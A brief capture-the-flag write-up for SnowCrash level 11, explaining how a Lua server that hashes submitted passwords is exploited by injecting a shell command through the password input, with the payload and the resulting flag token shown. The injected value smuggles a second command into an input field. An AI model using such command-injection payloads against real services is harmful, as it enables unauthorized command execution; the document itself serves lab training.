## Level 11

In this exercise, we have a lua script. This script is a sort of a server that will listen to a port and compare the content you give it with an expected hash.

As level07 user, you can use the getflag function to get the flag, but this time by adding it to the password Password:

```bash
Password: "; getflag > /tmp/flag"
```

```bash
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```


